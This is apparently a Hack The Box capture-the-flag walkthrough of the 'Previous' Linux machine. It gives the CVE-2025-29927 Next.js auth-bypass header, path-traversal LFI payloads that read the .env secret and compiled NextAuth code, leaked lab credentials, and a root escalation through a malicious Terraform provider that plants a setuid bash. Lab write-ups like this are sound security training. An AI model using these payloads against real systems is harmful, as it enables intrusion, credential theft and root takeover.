---
icon: linux
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: false
  tags:
    visible: true
---

# Previous Machine Walk-through

<figure><img src="../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

_Welcome! This write-up walks through the_ **Previous** _machine on Hack The Box. My goal is simple: stay motivated, record what I learn, and explain each step so the techniques and concepts stick. Follow along, replicate the steps, and level up your skills._

### About Machine <a href="#c9a6" id="c9a6"></a>

`Previous` is a medium-difficulty Linux machine that features a web application vulnerable to [CVE-2025-29927](https://nvd.nist.gov/vuln/detail/CVE-2025-29927), an authorization bypass vulnerability in the `Next.js` authentication middleware, allowing access to restricted documentation pages. Further enumeration uncovers a Local File Inclusion (LFI) vulnerability, which is leveraged to extract the compiled `Next.js` server files and retrieve user credentials. With SSH access as a standard user, privilege escalation is achieved through `Terraform` by exploiting the ability to run the `apply` command with root privileges.

### Machine Info <a href="#b728" id="b728"></a>

**Machine Name:** Previous\
**Machine Type:** Linux\
**Difficulty:** Medium\
**Link:** \[[https://app.hackthebox.com/machines/Previous](https://app.hackthebox.com/machines/Previous)]

### Initial Scanning: <a href="#id-1a39" id="id-1a39"></a>

```bash
nmap -p- -A -sC -vv --min-rate 10000 10.10.11.83 -oN scan.txt

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://previous.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/29%OT=22%CT=1%CU=38492%PV=Y%DS=2%DC=T%G=Y%TM=68B177C
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST1
OS:1NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 42.662 days (since Thu Jul 17 23:26:51 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   108.17 ms 10.10.14.1
2   108.22 ms 10.10.11.83
```

We can see that here two ports are open 22 and 80 and also see the domain name `previous.htb`.

Now we add the `previous.htb` to our /etc/hosts file:

```bash
sudo echo "10.10.11.83 previous.htb" | sudo tee -a /etc/hosts
```

When we click Get Started, we can see the website open a singin page. We notice the url something different like this:

Press enter or click to view image in full size

<figure><img src="https://miro.medium.com/v2/resize:fit:700/0*1sJV8JX6ZGsyDRM-" alt="" height="269" width="700"><figcaption></figcaption></figure>

That means The callbackURL from the API points to an internal resource.

Now we can try to enumerate web technologies and framework we can found this: `next.js 15.2.2`

<figure><img src="https://miro.medium.com/v2/resize:fit:495/0*Eecjr2OX9jr840D5" alt="" height="541" width="495"><figcaption></figcaption></figure>

And If we search for an exploit regarding this version, we can find this: [CVE-2025–29927](https://www.exploit-db.com/exploits/52124)

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*Q2NFsXMxJWuHCKb7Lj2uxQ.png" alt="" height="231" width="700"><figcaption></figcaption></figure>

After many research and looking many PoCs we can see that the exploit which will basically tell us we need to use an special header to bypass the authentication, we need to use this header:

```bash
-H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'
```

Now try to bypass the auth to read the docs by using Burp Suite.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*e29tBsm39ZabmeA82Simgg.png" alt="" height="390" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*9fSg9ygSstsjSYkwnVP_YQ.png" alt="" height="271" width="700"><figcaption></figcaption></figure>

It works, we’re able to bypass the auth and can read files.

Inside the docs we don’t see any interesting information. Now we can try to directory listing for any hidden stuff.

```bash
gobuster dir -u http://previous.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobusetr.txt -t 50
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*JbhQHh07EZrIzvRNeBTZ0A.png" alt="" height="310" width="700"><figcaption></figcaption></figure>

And we found many directories but one of the most pretty interesting direcotory is `/api`. Now try to found more information in this directory: [`http://previous.htb/api`](http://previous.htb/api)

> _Note: Remember use `-H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'` header for bypass auth._

```bash
gobuster dir -u http://previous.htb/api/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobusetr.txt -t 50 -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*Ge-MhV3yqeG2gdUW9hWvxw.png" alt="" height="209" width="700"><figcaption></figcaption></figure>

We found `/download`. If we check this endpoint. we can see the error Invalid Filename. it means filename is not our parameter, we need to fuzz it.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*AdCxCzHgFwBJDrZ44tG2Hw.png" alt="" height="240" width="700"><figcaption></figcaption></figure>

We can try to Fuzz the parameter using Caido and we found the parameter name is `example`.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*RQc_6x5dom3CDTtojaC38Q.png" alt="" height="315" width="700"><figcaption></figcaption></figure>

Now try to LFI by using this parameter. And LFI is work.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*29jqM9dM_O0iopF6B_D73w.png" alt="" height="310" width="700"><figcaption></figcaption></figure>

Now let’a attempt to read more files, We can attempt to read the secret of the app by using this path: `../../../proc/self/cwd/.env` and we can see this: `NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a` in response. it means we can read the internal files from the server.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*5lPTjFBbmQew_866xfXJZw.png" alt="" height="337" width="700"><figcaption></figcaption></figure>

Now search from the documentation of the NEXTAUTH to find out where the configuration file is stored as it may contain credentials, and we found the NEXTAUTH global configuration at: `pages/api/auth/[...nextauth].js`

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*5WI8843cyuUxvyQ7Y6ZJ7g.png" alt="" height="335" width="700"><figcaption></figcaption></figure>

By knowing that when building a next.js project, the server-side code, including API routes, is compiled and placed within the .next/server directory we got our full route to fetch the info:

```bash
../../../proc/self/cwd/.next/server/pages/api/auth/[...nextauth].js
```

Now try to request using this full path. and we get the following response:

```bash
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 31 Aug 2025 10:00:23 GMT
Content-Type: application/zip
Content-Length: 1537
Connection: close
Content-Disposition: attachment; filename=../../../proc/self/cwd/.next/server/pages/api/auth/[...nextauth].js
ETag: "ihx6eiwskd47b"

"use strict";(()=>{var e={};e.id=651,e.ids=[651],e.modules={3480:(e,n,r)=>{e.exports=r(5600)},5600:e=>{e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},6435:(e,n)=>{Object.defineProperty(n,"M",{enumerable:!0,get:function(){return function e(n,r){return r in n?n[r]:"then"in n&&"function"==typeof n.then?n.then(n=>e(n,r)):"function"==typeof n&&"default"===r?n:void 0}}})},8667:(e,n)=>{Object.defineProperty(n,"A",{enumerable:!0,get:function(){return r}});var r=function(e){return e.PAGES="PAGES",e.PAGES_API="PAGES_API",e.APP_PAGE="APP_PAGE",e.APP_ROUTE="APP_ROUTE",e.IMAGE="IMAGE",e}({})},9832:(e,n,r)=>{r.r(n),r.d(n,{config:()=>l,default:()=>P,routeModule:()=>A});var t={};r.r(t),r.d(t,{default:()=>p});var a=r(3480),s=r(8667),i=r(6435);let u=require("next-auth/providers/credentials"),o={session:{strategy:"jwt"},providers:[r.n(u)()({name:"Credentials",credentials:{username:{label:"User",type:"username"},password:{label:"Password",type:"password"}},authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null})],pages:{signIn:"/signin"},secret:process.env.NEXTAUTH_SECRET},d=require("next-auth"),p=r.n(d)()(o),P=(0,i.M)(t,"default"),l=(0,i.M)(t,"config"),A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:"/api/auth/[...nextauth]",pathname:"/api/auth/[...nextauth]",bundlePath:"",filename:""},userland:t})}};var n=require("../../../webpack-api-runtime.js");n.C(e);var r=n(n.s=9832);module.exports=r})();
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*lEaRafcyyoDQbBKs5u5aKA.png" alt="" height="385" width="700"><figcaption></figcaption></figure>

After carefully analysing the response we can found some creadentials:

```bash
username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")
```

actual Creadentials:

```bash
jeremy: MyNameIsJeremyAndILovePancakes
```

Now lets try to connect with ssh. And we successfully get ssh connection.\
And also we get user flag.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*jtBZNXjb1AEfW_1t--e2lw.png" alt="" height="423" width="700"><figcaption></figcaption></figure>

Now for PrvEsc, we first try to see sudo permissions and dwe can see this:

```bash
bash-5.1$ sudo -l
[sudo] password for jeremy: 
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*esTl7IMknUBTntIzVFkXFw.png" alt="" height="83" width="700"><figcaption></figcaption></figure>

it means we are able to run `/usr/bin/terraform -chdir\=/opt/examples apply` as a root.

Let’s run the file binary to chack it behaviour and the output is:

```bash
bash-5.1$ sudo /usr/bin/terraform -chdir\=/opt/examples apply
╷
│ Warning: Provider development overrides are in effect
│ 
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /usr/local/go/bin
│ 
│ The behavior may therefore not match any released version of the provider and applying changes may cause the state to become incompatible with published releases.
╵
examples_example.example: Refreshing state... [id=/home/jeremy/docker/previous/public/examples/hello-world.ts]

No changes. Your infrastructure matches the configuration.

Terraform has compared your real infrastructure against your configuration and found no differences, so no changes are needed.

Apply complete! Resources: 0 added, 0 changed, 0 destroyed.                                                                                                            
                                                                                                                                                                       
Outputs:                                                                                                                                                               
                                                                                                                                                                       
destination_path = "/home/jeremy/docker/previous/public/examples/hello-world.ts" 
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*YuMHOQ0H1EsWu3XTwylvhw.png" alt="" height="188" width="700"><figcaption></figcaption></figure>

By carefully analyzing the we can see somethis interesting in this: `destination_path = "/home/jeremy/docker/previous/public/examples/hello-world.ts"`

Now lets check our home directory by using `ls -all` and we can found another interesting file called `.terraformrc`.

By checking the file we can see tha file contant:

```bash
bash-5.1$ cat .terraformrc
provider_installation {
        dev_overrides {
                "previous.htb/terraform/examples" = "/usr/local/go/bin"
        }
        direct {}
}
```

Press enter or click to view image in full size

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*uUs2INWkmE-bQ-HUN5ooPw.png" alt="" height="126" width="700"><figcaption></figcaption></figure>

We can make it point to a directory we create, inside of this directory, we can create a malicious provider which will create a setuid shell, let’s do this:

```bash
mkdir /home/jeremy/emni

cd /tmp
vim exploit.c

    #include <stdlib.h>
    int main() {
        system("cp /bin/bash /tmp/bash && chmod u+s /tmp/bash");
        return 0;
    }

gcc -o /home/jeremy/emni/terraform-provider-examples /tmp/exploit.c

chmod +x /home/jeremy/emni/terraform-provider-examples
```

Now modify the `.terraformrc` file to point to our directory:

```bash
provider_installation {
        dev_overrides {
                "previous.htb/terraform/examples" = "/home/jeremy/emni"
        }
        direct {}
}
```

Now we can run the binary:

```bash
sudo /usr/bin/terraform -chdir\=/opt/examples apply
```

And go to `/tmp` directory and check we can get the bash binary.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*TZNrESUe7krfAeQHSXJhrg.png" alt="" height="428" width="700"><figcaption></figcaption></figure>

Now run the following command to get root shell:

```bash
/tmp/bash -p
```

<figure><img src="https://miro.medium.com/v2/resize:fit:418/1*9WEkLTJoySMuxMTHuRPCKg.png" alt="" height="118" width="418"><figcaption></figcaption></figure>

***

> I hope you enjoyed this writeup! Happy Hacking :)
>
> Follow to me on Medium and be sure to turn on email notifications so you never miss out on my latest informative posts.

### Follow me on below Social Media: <a href="#id-1106" id="id-1106"></a>

1. _**LinkedIn:**_ [_**Subhadip Sardar**_](http://linkedin.com/in/subhadip-sardar)
2. _**Twitter | X :**_ [_**@Mr\_SubhaDip03**_](https://x.com/Mr_SubhaDip03)
3. _**GitHub :**_ [_**SubhaDip003**_](https://github.com/SubhaDip003)
4. _**Check My TryHackMe Profile :**_ [_**TryHackMe | SubhaDip**_](https://tryhackme.com/r/p/SubhaDip)
5. _**Check My HackTheBox Profile:**_ [_**Hack The Box | SubhaDip03**_](https://app.hackthebox.com/profile/1658126)
